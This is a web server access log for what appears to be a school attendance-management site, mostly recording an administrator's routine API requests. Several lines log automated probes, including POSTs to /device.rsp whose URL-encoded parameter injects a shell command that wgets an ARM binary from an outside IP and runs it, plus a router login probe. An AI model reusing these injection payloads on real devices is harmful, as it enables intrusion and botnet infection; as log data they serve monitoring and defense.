118.70.191.159 - - [07/May/2025:19:09:42 +0000] "GET / HTTP/1.1" 504 569 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:17 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 3586 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:17 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 3586 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:17 +0000] "GET /api-nodejs/classes? HTTP/1.1" 200 4837 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:17 +0000] "GET /api-nodejs/classes?search=&academicYear= HTTP/1.1" 200 4837 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:17 +0000] "GET /api-nodejs/classes? HTTP/1.1" 200 4837 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:17 +0000] "GET /api-nodejs/classes?search=&academicYear= HTTP/1.1" 200 4837 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:17 +0000] "GET /api-nodejs/classes? HTTP/1.1" 200 4837 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:17 +0000] "GET /api-nodejs/classes? HTTP/1.1" 200 4837 "http://fams.io.vn/ClassManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:18 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 4837 "http://fams.io.vn/UserManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:18 +0000] "GET /api-nodejs/users?page=1&limit=5&roles=student%2Cteacher%2Cparent HTTP/1.1" 200 4961 "http://fams.io.vn/UserManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:18 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 4837 "http://fams.io.vn/UserManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:18 +0000] "GET /api-nodejs/users?page=1&limit=5&roles=student%2Cteacher%2Cparent HTTP/1.1" 200 4961 "http://fams.io.vn/UserManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:18 +0000] "GET /api-nodejs/users?page=1&academicYear=2022-2023&limit=5&roles=student%2Cteacher%2Cparent HTTP/1.1" 200 5334 "http://fams.io.vn/UserManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:18 +0000] "GET /api-nodejs/users?page=1&academicYear=2022-2023&limit=5&roles=student%2Cteacher%2Cparent HTTP/1.1" 200 5334 "http://fams.io.vn/UserManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:19 +0000] "GET /api-nodejs/users/details/admin HTTP/1.1" 200 431 "http://fams.io.vn/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:19 +0000] "GET /api-nodejs/users/details/admin HTTP/1.1" 200 431 "http://fams.io.vn/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:20 +0000] "GET /api-nodejs/rfid/users HTTP/1.1" 200 36 "http://fams.io.vn/IdentifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:20 +0000] "GET /api-nodejs/rfid/users HTTP/1.1" 200 36 "http://fams.io.vn/IdentifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:20 +0000] "GET /api-nodejs/facevector/user HTTP/1.1" 200 36 "http://fams.io.vn/IdentifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:20 +0000] "GET /api-nodejs/facevector/user HTTP/1.1" 200 36 "http://fams.io.vn/IdentifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:22 +0000] "GET /api-nodejs/rfid/users HTTP/1.1" 200 36 "http://fams.io.vn/IdentifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:22 +0000] "GET /api-nodejs/rfid/users HTTP/1.1" 200 36 "http://fams.io.vn/IdentifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:11:23 +0000] "GET /ws HTTP/1.1" 101 18556 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
176.65.148.61 - - [07/May/2025:19:16:25 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://14.225.204.42:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
176.65.148.61 - - [07/May/2025:19:16:25 +0000] "" 400 0 "-" "-"
141.98.11.27 - - [07/May/2025:19:17:15 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F103.149.29.68%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 150 "-" "Mozila/5.0"
80.82.77.202 - - [07/May/2025:19:22:33 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
118.70.191.159 - - [07/May/2025:19:23:38 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:38 +0000] "GET /static/js/bundle.js HTTP/1.1" 304 0 "http://fams.io.vn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:38 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 200 402 "http://fams.io.vn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:38 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 200 402 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:39 +0000] "GET /api-nodejs/users/details/admin HTTP/1.1" 200 431 "http://fams.io.vn/AdminHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:39 +0000] "GET /api-nodejs/users/details/admin HTTP/1.1" 200 431 "http://fams.io.vn/AdminHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:40 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/AttendanceManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:40 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/AttendanceManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:40 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/AttendanceManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:40 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/AttendanceManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:41 +0000] "GET /api-nodejs/attendance?userId=&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 380215 "http://fams.io.vn/AttendanceManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:41 +0000] "GET /api-nodejs/attendance?userId=&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 380215 "http://fams.io.vn/AttendanceManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:42 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:42 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 106 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:42 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 106 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:42 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:51 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 106 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:23:52 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 106 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
109.185.151.233 - - [07/May/2025:19:24:43 +0000] "GET / HTTP/1.1" 200 1745 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
54.86.50.139 - - [07/May/2025:19:24:46 +0000] "GET /api-nodejs/notifications/my-notifications HTTP/1.1" 200 106 "-" "PostmanRuntime/7.43.4"
193.34.212.110 - - [07/May/2025:19:25:42 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20llarm7%3B%20wget%20http%3A%2F%2F103.188.82.240%2Fllarm7%3B%20chmod%20777%20%2A%3B%20.%2Fllarm7%20xpl5 HTTP/1.1" 404 150 "-" "Mozila/5.0"
141.98.11.27 - - [07/May/2025:19:27:26 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F103.149.29.68%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 150 "-" "Mozila/5.0"
118.70.191.159 - - [07/May/2025:19:29:57 +0000] "POST /api-nodejs/notifications/send-to-user HTTP/1.1" 201 166 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:00 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 106 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:00 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 106 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:09 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 200 513 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:09 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/UserHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:09 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/UserHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:11 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 106 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:11 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:11 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 106 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:11 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:12 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 106 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:12 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 106 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:13 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 106 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:17 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 200 484 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:18 +0000] "GET /api-nodejs/users/details/admin HTTP/1.1" 200 431 "http://fams.io.vn/AdminHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:18 +0000] "GET /api-nodejs/users/details/admin HTTP/1.1" 200 431 "http://fams.io.vn/AdminHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:21 +0000] "GET /ws HTTP/1.1" 101 19324 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:22 +0000] "GET /main.244333fdaf72ffb37aa5.hot-update.json HTTP/1.1" 200 28 "http://fams.io.vn/AdminHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:19:30:22 +0000] "GET /main.244333fdaf72ffb37aa5.hot-update.js HTTP/1.1" 200 4459 "http://fams.io.vn/AdminHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
